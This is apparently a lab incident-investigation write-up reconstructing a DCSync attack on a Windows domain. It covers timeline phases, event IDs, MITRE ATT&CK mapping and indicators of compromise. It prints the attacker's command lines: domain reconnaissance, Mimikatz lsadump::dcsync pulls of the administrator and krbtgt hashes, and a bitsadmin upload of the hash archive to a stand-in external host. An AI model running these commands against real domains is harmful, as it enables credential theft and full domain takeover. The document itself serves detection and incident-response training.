# 🏛️ Investigation 17 – Active Directory DCSync Attack & Password Hash Exfiltration

## 📌 Scenario

An attacker compromised an administrative workstation (`WIN-ADM01`) and performed Active Directory reconnaissance before abusing the **DCSync** technique to request password hashes directly from the Domain Controller. The attacker successfully extracted the **Administrator** and **KRBTGT** account hashes, compressed them into an archive, exfiltrated them to an external server, and cleared Windows Security Event Logs to conceal the attack.

---

# 🎯 Investigation Objectives

- Investigate Active Directory reconnaissance
- Detect DCSync attack activity
- Analyze Directory Service Access events
- Investigate Mimikatz execution
- Detect Administrator hash theft
- Detect KRBTGT hash theft
- Analyze password hash staging
- Investigate archive creation
- Detect hash exfiltration
- Investigate anti-forensics activity
- Map attacker behavior to MITRE ATT&CK

---

# 📊 Investigation Summary

| Category | Result |
|----------|--------|
| Total Events | **24** |
| Initial Host | **WIN-ADM01** |
| Target Domain Controller | **DC01** |
| Primary User | **john.admin** |
| High Value Accounts Targeted | **Administrator, KRBTGT** |
| Attack Type | **Active Directory DCSync Attack** |
| Incident Severity | 🔴 Critical |

---

# 📈 Event ID Analysis

| Event ID | Description | Count |
|----------|-------------|------:|
|1102|Audit Log Cleared|1|
|4624|Successful Logon|2|
|4625|Failed Logon|1|
|4634|Logoff|1|
|4662|Directory Service Access|2|
|4672|Special Privileges Assigned|1|
|4688|Process Creation|15|
|5156|Allowed Network Connection|1|

---

# 📊 Severity Distribution

| Severity | Count |
|----------|------:|
|🔴 Critical|7|
|🟠 High|7|
|🟡 Medium|4|
|🟢 Low|6|

---

# 👤 Most Active User

| User | Activity |
|------|----------|
| **john.admin** | Administrative account used throughout the attack |

---

# 🔍 Investigation Findings

---

## Phase 1 – Initial Compromise

### Events Observed

- Successful Logon (4624)
- Special Privileges Assigned (4672)

### Findings

The attacker gained access to an administrative workstation (`WIN-ADM01`) using the **john.admin** account and received elevated privileges.

---

## Phase 2 – Active Directory Reconnaissance

### Commands

```cmd
whoami /all
hostname
ipconfig /all
nltest /dclist:corp.local
net group "Domain Admins" /domain
dsquery computer
dsquery user
```

### Findings

The attacker enumerated:

- Logged-on user
- Hostname
- Network configuration
- Domain Controller
- Domain Admins
- Domain computers
- Domain users

This information was used to prepare for the DCSync attack.

---

## Phase 3 – DCSync Attack

### Commands

```cmd
mimikatz.exe lsadump::dcsync /domain:corp.local /user:administrator
```

```cmd
mimikatz.exe lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Findings

Instead of dumping credentials from the LSASS process, the attacker abused **Active Directory replication** to request password hashes directly from the Domain Controller.

Targeted accounts:

- Administrator
- KRBTGT

This technique allows attackers to obtain highly privileged credentials without accessing LSASS memory.

---

## Phase 4 – Directory Service Access

### Event ID

```
4662
```

### Findings

Windows recorded Directory Service Access events, indicating unauthorized replication requests associated with the DCSync attack.

---

## Phase 5 – Hash Collection

### Command

```cmd
cmd.exe /c copy administrator.hash C:\Users\Public\hashes.txt
```

### Findings

The attacker collected stolen password hashes into a single file (`hashes.txt`) to simplify exfiltration.

---

## Phase 6 – Archive Creation

### Command

```cmd
7z.exe a C:\Users\Public\hashes.7z hashes.txt
```

### Findings

The stolen hashes were compressed into **hashes.7z** before transmission.

---

## Phase 7 – Hash Exfiltration

### Command

```cmd
bitsadmin /transfer hashupload /upload /priority normal C:\Users\Public\hashes.7z http://dcsync.example/upload
```

### Event ID

```
5156
```

### Findings

The compressed archive containing Active Directory password hashes was uploaded to attacker-controlled infrastructure.

---

## Phase 8 – Evidence Removal

### Commands

```cmd
cmd.exe /c del C:\Users\Public\hashes.7z
```

```cmd
cmd.exe /c del C:\Users\Public\hashes.txt
```

### Findings

The attacker removed all locally staged credential files after successful exfiltration.

---

## Phase 9 – Anti-Forensics

### Event ID

```
1102
```

### Findings

Windows Security Audit Logs were cleared to hide evidence of:

- DCSync execution
- Mimikatz activity
- Password hash theft
- Network communication

---

# 📈 Complete Attack Timeline

```text
Initial Logon
      │
Privilege Assignment
      │
Active Directory Reconnaissance
      │
Identify Domain Controller
      │
DCSync Administrator
      │
DCSync KRBTGT
      │
Directory Replication Abuse
      │
Copy Password Hashes
      │
Compress Hashes
      │
Upload Hash Archive
      │
Delete Local Files
      │
Clear Security Event Logs
```

---

# 🎯 MITRE ATT&CK Mapping

| Technique | ID |
|------------|----|
| Account Discovery | T1087 |
| Domain Controller Discovery | T1018 |
| Permission Groups Discovery | T1069 |
| Domain Account Discovery | T1087.002 |
| DCSync | T1003.006 |
| Directory Service Access | T1003.006 |
| Archive Collected Data | T1560.001 |
| Exfiltration Over Alternative Protocol | T1048 |
| File Deletion | T1070.004 |
| Clear Windows Event Logs | T1070.001 |

---

# 🚩 Indicators of Compromise (IOCs)

## Hosts

- WIN-ADM01
- DC01

## Users

- john.admin
- administrator
- krbtgt

## Suspicious Processes

- mimikatz.exe
- dsquery.exe
- nltest.exe
- bitsadmin.exe
- cmd.exe
- 7z.exe
- wevtutil.exe

## Suspicious Files

- administrator.hash
- krbtgt.hash
- hashes.txt
- hashes.7z

## Network Indicators

### Internal

- 192.168.60.21
- 192.168.60.10

### External

- 198.51.100.250

---

# 🚨 Incident Conclusion

The investigation revealed a successful **Active Directory DCSync attack** in which the attacker abused directory replication privileges to obtain the password hashes of the **Administrator** and **KRBTGT** accounts directly from the Domain Controller. The stolen hashes were consolidated into a text file, compressed into an archive, and exfiltrated using **BITSAdmin**. The attacker then deleted all staged credential files and cleared the Windows Security Event Log to hinder forensic investigation. Compromise of the **KRBTGT** account represents a critical enterprise risk because it can enable advanced Kerberos attacks, including the creation of forged authentication tickets.

---

# 🛠️ Skills Demonstrated

- Splunk Enterprise Investigation
- Active Directory Security Analysis
- DCSync Detection
- Windows Event Log Analysis
- Threat Hunting
- Password Hash Theft Investigation
- Directory Service Analysis
- Mimikatz Detection
- Credential Access Investigation
- IOC Identification
- MITRE ATT&CK Mapping
- Incident Response
- Attack Timeline Reconstruction
- Anti-Forensics Investigation

---

# ⭐ Investigation Status

✅ Completed

**Difficulty:** ⭐⭐⭐⭐⭐⭐⭐ (Expert Active Directory DCSync Investigation)
